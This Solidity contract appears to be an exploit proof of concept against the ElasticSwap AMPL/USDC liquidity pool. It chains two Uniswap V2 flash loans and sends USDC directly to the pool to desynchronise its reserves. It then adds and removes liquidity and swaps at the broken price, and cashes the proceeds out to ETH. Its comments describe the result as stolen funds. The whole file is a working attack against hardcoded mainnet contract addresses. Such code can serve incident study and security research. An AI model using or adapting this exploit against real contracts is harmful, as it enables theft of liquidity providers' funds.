// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.17;

import "forge-std/console.sol";

import "./ElasticSwapInterfaces.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@v2-periphery/contracts/interfaces/IWETH.sol";

contract Attack is IUniswapV2Callee {

    address constant private ampl = 0xD46bA6D942050d489DBd938a2C909A5d5039A161; // AMPL token address
    address constant private usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC token address
    address constant private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH token address

    address constant private AMPL_USDC_pool = 0xa0c5aA50cE3cc69b1c478d8235597bC0c51DfDAb; // AMPL <-> USDC ElasticSwap Pool (the target)
    address constant private AMPL_WETH_pool = 0xc5be99A02C6857f9Eac67BbCE58DF5572498F40c; // AMPL <-> WETH UniswapV2 Pool
    address constant private USDC_USDT_pool = 0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f; // USDC <-> USDT UniswapV2 Pool
    
    address constant private router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // UniswapV2 router

    // Contract needs to be payable to accept the WETH withdraw
    receive() external payable {}

    function attack() external {

        // Prepare flashloan data for the callback
        bytes memory data = new bytes(1);
        data[0] = 0x11;

        // Flashloan to get AMPL tokens
        // The uniswap pair will call our `uniswapV2Call` function with data `0x11`
        IUniswapV2Pair(AMPL_WETH_pool).swap(0, 940_000_000_000_000, address(this), data);

        // We have successfully stolen funds
        // Now we convert them to Ether

        // Declare an address array that we will use to define the swap paths
        address[] memory path = new address[](2);

        // Swap all AMPL tokens for WETH
        IERC20(ampl).approve(router, type(uint256).max);
        uint256 amplBalance = IERC20(ampl).balanceOf(address(this));
        path[0] = ampl;
        path[1] = weth;
        IUniswapV2Router01(router).swapExactTokensForTokens(amplBalance, 1, path, address(this), block.timestamp);

        // Swap all USDC tokens for WETH
        IERC20(usdc).approve(router, type(uint256).max);
        uint256 usdcBalance = IERC20(usdc).balanceOf(address(this));
        path[0] = usdc;
        path[1] = weth;
        IUniswapV2Router01(router).swapExactTokensForTokens(usdcBalance, 1, path, address(this), block.timestamp);

        // Exchange WETH for Ether
        uint256 wethBalance = IERC20(weth).balanceOf(address(this));
        IWETH(weth).withdraw(wethBalance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // If this is the first call to our flashloan hook
        if(data[0] == 0x11) {
            // Prepare flashloan data for the second callback
            bytes memory secondSwapData = new bytes(1);
            secondSwapData[0] = 0x22;

            // Flashloan to get USDC tokens
            // The uniswap pair will call this function with data `0x22`
            IUniswapV2Pair(USDC_USDT_pool).swap(2_900_000_000_000, 0, address(this), secondSwapData);

            // Pay back the AMPL flashloan
            IERC20(ampl).transfer(AMPL_WETH_pool, (amount1 * 1004) / 1000);
        }
        // Otherwise if this is the second call to our flashloan hook
        else if (data[0] == 0x22) {
            // We have the AMPL and USDC necessary to start the exploit
            exploit();

            // Pay back the USDC flashloan
            IERC20(usdc).transfer(USDC_USDT_pool, (amount0 * 1004) / 1000);
        }
    }

    function exploit() internal {

        // Approve max for AMPL and USDC
        IERC20(ampl).approve(AMPL_USDC_pool, type(uint256).max);
        IERC20(usdc).approve(AMPL_USDC_pool, type(uint256).max);

        // Add liquidity single sided
        ElasticSwap(AMPL_USDC_pool).addLiquidity(183277868919506, 0, 0, 0, address(this), block.timestamp);

        // Add liquidity both assets
        ElasticSwap(AMPL_USDC_pool).addLiquidity(164204588455430, 249072677422, 0, 0, address(this), block.timestamp);

        // Transfer directly to pool so ElasticSwap reserve amount is different to its actual USDC balance
        IERC20(usdc).transfer(AMPL_USDC_pool, 776350901415);

        // Withdraw liquidity taking advantage of the difference between reserve and actual USDC balance to break pricing
        ElasticSwap(AMPL_USDC_pool).removeLiquidity(IERC20(AMPL_USDC_pool).balanceOf(address(this)), 1, 1, address(this), block.timestamp);

        // Swap in lots of USDC for AMPL taking advantage of broken pricing
        MathLib.InternalBalances memory ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        ElasticSwap(AMPL_USDC_pool).swapQuoteTokenForBaseToken(ib.quoteTokenReserveQty * 100, 1, block.timestamp);

        // Add all AMPl and USDC as liquidity and then immediately remove so you get an equal ratio when you withdraw
        uint256 amplBalance = IERC20(ampl).balanceOf(address(this));
        uint256 usdcBalance = IERC20(usdc).balanceOf(address(this));
        ElasticSwap(AMPL_USDC_pool).addLiquidity(amplBalance, usdcBalance, 0, 0, address(this), block.timestamp);
        uint256 elasticLpBalance = IERC20(AMPL_USDC_pool).balanceOf(address(this));
        ElasticSwap(AMPL_USDC_pool).removeLiquidity(elasticLpBalance, 1, 1, address(this), block.timestamp);
    }
}